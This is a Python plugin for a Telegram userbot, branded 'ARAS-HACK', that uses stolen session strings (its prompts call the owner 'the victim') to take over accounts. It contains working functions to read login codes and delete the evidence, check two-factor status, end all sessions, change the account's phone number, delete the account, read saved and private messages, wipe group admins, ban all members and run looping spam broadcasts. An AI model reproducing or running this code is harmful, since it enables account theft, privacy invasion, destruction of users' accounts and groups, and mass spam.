from JoKeRUB import bot, l313l
#By Source joker @ucriss
from telethon import events, functions, types, Button
from datetime import timedelta
from JoKeRUB.utils import admin_cmd
import asyncio
from ..Config import Config
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon
from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa
from telethon.tl.functions.channels import CreateChannelRequest as ccr
from telethon.tl.functions.account import UpdateProfileRequest

bot = borg = tgbot
Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"

# ============== الوظائف الأساسية ==============

async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try: 
            result = await X(functions.account.ChangePhoneRequest(
                phone_number=number,
                phone_code_hash=code,
                phone_code=otp
            ))
            return True
        except:
            return False

async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        result = await X(functions.account.SendChangePhoneCodeRequest(
            phone_number=number,
            settings=types.CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True
            )
        ))
        return str(result)

async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return str(k)

async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(rt())
            return True
        except Exception as rr:
            return rr

async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
        except:
            await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')

async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            result = await X(functions.account.GetPasswordRequest())
            if result.has_password:
                h = result.hint
                if h == None:
                    h = "لا يوجد"
                return False, h
            else:
                return True, "n"
        except:
            return False, "لا يوجد"

async def demall(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
            except:
                await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)

async def get_saved_messages(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        saved_messages = []
        async for message in X.iter_messages("me"):
            saved_messages.append(f"📩 {message.text}\n⏰ {message.date}\n\n")
        return ''.join(saved_messages) if saved_messages else "لا توجد رسائل محفوظة"

async def joingroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(join(username))

async def leavegroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(leave(username))

async def delgroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(dc(username))

async def get_user_messages(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            user_entity = await X.get_entity(username)
            messages = []
            
            async for message in X.iter_messages(user_entity.id, limit=500):
                msg_text = message.text or "مرفق (صورة/ملف/إلخ)"
                messages.append(f"📩 {msg_text}\n⏰ {message.date}\n\n")
            
            return ''.join(messages) if messages else "لا توجد رسائل مع هذا المستخدم"
        except Exception as e:
            return f"حدث خطأ: {str(e)}"

async def cu(strses):
    try:
        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception as e:
        return False

async def usermsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        i = ""
        
        async for x in X.iter_messages(777000, limit=3):
            i += f"\n{x.text}\n"
        await X.delete_dialog(777000)
        return str(i)

async def userbans(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_participants(grp)
        for x in k:
            try:
                await X.edit_permissions(grp, x.id, view_messages=False)
            except:
                pass

async def change_bio(strses, new_bio):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(UpdateProfileRequest(about=new_bio))
            return True
        except Exception as e:
            print(e)
            return False

async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
            except:
                pass
        return str(i)

# ============== دوال البث الجماعي ==============

async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            tol = msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if chat != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep(1)
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            tol = msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            tol = msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

# ============== القائمة الرئيسية ==============

menu = '''
**╭─━━━━━━━━━━━━━─╮**
**     🔰 ARAS-HACK 🔰**
**╰─━━━━━━━━━━━━━─╯**

**🅐** :~ [معرفه قنوات/كروبات التي يملكها]
**🅑** :~ [جلب جميع معلومات المستخدم]
**🅒** :~ [تفليش كروب/قناه]
**🅓** :~ [جلب اخر رسائل تسجيل الدخول]
**🅔** :~ [انضمام الى كروب/قناه]
**🅕** :~ [مغادره كروب /قناه]
**🅖** :~ [مسح كروب /قناه]
**🅗** :~ [فحص التحقق بخطوتين]
**🅘** :~ [انهاء جميع الجلسات]
**🅙** :~ [حذف الحساب]
**🅚** :~ [حذف جميع المشرفين]
**🅛** :~ [ترقيه عضو الى مشرف]
**🅜** :~ [تغير رقم الحساب]
**🅝** :~ [البث الجماعي الشامل]
**🅞** :~ [جلب الرسائل المحفوظة]
**🅟** :~ [جلب رسائل مستخدم معين]
**🅠** :~ [تغيير البايو]

**╭─━━━━━━━━━━━━━─╮**
**ㅤ  ᯽ البث الجماعي ᯽ **
**╰─━━━━━━━━━━━━━─╯**

**🅐🅐** :~ [البث للجميع]
**🅑🅑** :~ [البث للمجموعات فقط]
**🅒🅒** :~ [البث للأشخاص فقط]

**╭─━━━━━━━━━━━━━─╮**
**ㅤㅤㅤ[𓏺 𝖺𝖱𝖱𝖺𝖲 .](https://t.me/Lx5x5)**
**╰─━━━━━━━━━━━━━─╯**
'''

# ============== الكيبورد الرئيسي ==============

keyboard = [
    [
        Button.inline("🅐", data="ARAS-Hack-A"),
        Button.inline("🅑", data="ARAS-Hack-B"),
        Button.inline("🅒", data="ARAS-Hack-C"),
        Button.inline("🅓", data="ARAS-Hack-D"),
        Button.inline("🅔", data="ARAS-Hack-E")
    ],
    [
        Button.inline("🅕", data="ARAS-Hack-F"),
        Button.inline("🅖", data="ARAS-Hack-G"),
        Button.inline("🅗", data="ARAS-Hack-H"),
        Button.inline("🅘", data="ARAS-Hack-I"),
        Button.inline("🅙", data="ARAS-Hack-J")
    ],
    [
        Button.inline("🅚", data="ARAS-Hack-K"),
        Button.inline("🅛", data="ARAS-Hack-L"),
        Button.inline("🅜", data="ARAS-Hack-M"),
        Button.inline("🅝", data="ARAS-Hack-N"),
        Button.inline("🅞", data="ARAS-Hack-O")
    ],
    [
        Button.inline("🅟", data="ARAS-Hack-P"),
        Button.inline("🅠", data="ARAS-Hack-Q")
    ],
    [
        Button.url("• المـطور •", "https://t.me/Lx5x5")
    ]
]

# ============== معالجة الإنلاين ==============

if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        builder = event.builder
        result = None
        joker = Bot_Username.replace("@", "")
        query = event.text
        await bot.get_me()
        if query.startswith("هاك") and event.query.user_id == bot.uid:
            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
            result = builder.article(
                title="ARAS HACK 🔰",
                description="أدوات إدارة الحسابات المتعددة",
                text="**✧︙ قم بالضغط على الزر لعرض قائمة الأوامر**",
                buttons=buttons
            )
        await event.answer([result] if result else None)

@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    lMl10l = Config.TG_BOT_USERNAME
    if event.reply_to_msg_id:
        await event.get_reply_message()
    response = await bot.inline_query(lMl10l, "هاك")
    await response[0].click(event.chat_id)
    await event.delete()

# ============== أمر البدء ==============

@tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_private))
async def start(event):
    if event.sender_id == bot.uid:
        await event.reply(f"**اختر ماتريد فعله مع الجلسة**\n\n{menu}", buttons=keyboard)

# ============== معالجات الأزرار ==============

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-A")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        if len(i) > 1:
            file = open("session.txt", "w")
            file.write(i + "\n\n**By ARAS HACK**")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(i + "\n\n**شكراً لأستخدامك ARAS HACK 🔰**\n/hack", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-B")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        i = await userinfo(strses.text)
        await event.reply(i + "\n\n**شكراً لأستخدامك ARAS HACK 🔰**\n/hack", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-C")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**أرسل لي معرف/ايدي الكروب او القناة**")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply("**يتم حظر جميع اعضاء القناة/الكروب** 🔥", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-D")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\n**شكراً لأستخدامك ARAS HACK 🔰**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-E")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**اعطني معرف/ايدي القناة او الكروب**")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply("**تم الانضمام الى القناة او الكروب** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-F")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**اعطيني معرف /ايدي الكروب او القناة**")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply("**لقد تم مغادرة القناة او الكروب** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-G")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**اعطيني معرف/ايدي القناة او الكروب**")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply("**لقد تم حذف القناة/الكروب** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-H")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        i, h = await user2fa(strses.text)
        if i:
            await event.reply("**لم يتم تفعيل التحقق بخطوتين** ✅\n**يمكنك استخدام الأمر 🅓 للحصول على كود الدخول**", buttons=keyboard)
        else:
            await event.reply(f"**تم تفعيل التحقق بخطوتين** 🔒\n**التلميح**: `{h}`", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-I")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        i = await terminate(strses.text)
        if i == True:
            await event.reply("**تم إنهاء جميع الجلسات بنجاح** ✅", buttons=keyboard)
        else:
            await event.reply(f"**حدث خطأ:**\n`{i}`", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-J")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await delacc(strses.text)
        await event.reply("**تم حذف الحساب بنجاح** ⚠️", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-K")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**ارسل لي معرف/ايدي القناة او الكروب**")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply("**تم إزالة جميع المشرفين** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-L")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**ارسل لي معرف/ايدي القناة او الكروب**")
        grp = await x.get_response()
        await x.send_message("**الان ارسل لي المعرف**")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply("**تم الترقية بنجاح** 👑", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-M")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**أعطني الرقم الجديد**\n⚠️ **ملاحظة**: لا تستخدم أرقام وهمية")
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond("**تم إرسال الكود إلى الرقم الجديد** ✅\n**انسخ الـ phone_code_hash**\n⏰ **انتظر 20 ثانية**")
            await asyncio.sleep(20)
            await x.send_message("**الان ارسل لي الهاش**")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("**الان ارسل لي الكود**")
            otp = (await x.get_response()).text
            changing = await change_number_code(strses.text, number, phone_code_hash, otp)
            if changing:
                await event.respond("**تم تغيير الرقم بنجاح** ✅")
            else:
                await event.respond("**فشل تغيير الرقم** ❌")
        except Exception as e:
            await event.respond(f"**خطأ:**\n`{str(e)}`")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-N")))
async def start(event):
    keyboard_gcast = [
        [Button.inline("🅐🅐 - للجميع", data="ARAS-Gcast-AA")],
        [Button.inline("🅑🅑 - للمجموعات", data="ARAS-Gcast-BB")],
        [Button.inline("🅒🅒 - للأشخاص", data="ARAS-Gcast-PP")],
        [Button.url("𓏺 𝙎𝙊𝙐𝙍𝘾𝞝 𝙍𝘼𝙎", "https://t.me/aqhvv")]
    ]
    await event.reply("**اختر نوع البث الجماعي:**\n\n**🅐🅐** - إرسال للجميع\n**🅑🅑** - إرسال للمجموعات فقط\n**🅒🅒** - إرسال للأشخاص فقط", buttons=keyboard_gcast)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Gcast-AA")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل لي الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**الان ارسل لي الرسالة**")
        msg = await x.get_response()
        await x.send_message("**جاري الإرسال...**")
        i = await gcasta(strses.text, msg.text)
        await event.reply(f"**تم البث بنجاح** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Gcast-BB")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**الان ارسل لي الرسالة**")
        msg = await x.get_response()
        await x.send_message("**جاري الإرسال...**")
        i = await gcastb(strses.text, msg.text)
        await event.reply(f"**تم البث للمجموعات بنجاح** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Gcast-CC")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        await x.send_message("**الان ارسل لي الرساله**")
        msg = await x.get_response()
        await x.send_message("**جاري الإرسال...**")
        i = await gcastc(strses.text, msg.text)
        await event.reply(f"**تم البث للأشخاص بنجاح** ✅", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-O")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحيه**\n/hack", buttons=keyboard)
        
        saved_msgs = await get_saved_messages(strses.text)
        if len(saved_msgs) > 4096:
            with open("saved_messages.txt", "w") as f:
                f.write(saved_msgs)
            await event.reply("**الرسائل كثيرة جداً، تم حفظها في ملف**", file="saved_messages.txt")
            os.remove("saved_messages.txt")
        else:
            await event.reply(f"**الرسائل المحفوظة:**\n\n{saved_msgs}\n\n**شكراً لأستخدامك ARAS HACK 🔰**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-P")))
async def get_user_messages_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if not op:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحية**\n/hack", buttons=keyboard)
        
        await x.send_message("**أرسل لي يوزر الشخص**\nمثال: `@username`")
        username = await x.get_response()
        
        await x.send_message("**جاري جلب الرسائل...**")
        messages = await get_user_messages(strses.text, username.text)
        
        if len(messages) > 4096:
            with open("user_messages.txt", "w") as f:
                f.write(messages)
            await event.reply("**الرسائل كثيرة جداً، تم حفظها في ملف**", file="user_messages.txt")
            os.remove("user_messages.txt")
        else:
            await event.reply(f"**رسائل المستخدم:**\n\n{messages}\n\n**شكراً لأستخدامك ARAS HACK 🔰**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-Q")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("**الان ارسل الكود تيرمكس**")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحية**\n/hack", buttons=keyboard)

        await x.send_message("**أرسل البايو الجديد**")
        new_bio_msg = await x.get_response()
        new_bio_text = new_bio_msg.text
        success = await change_bio(strses.text, new_bio_text)
        if success:
            await event.reply("**تم تغيير البايو بنجاح** ✅", buttons=keyboard)
        else:
            await event.reply("**فشل تغيير البايو** ❌", buttons=keyboard)
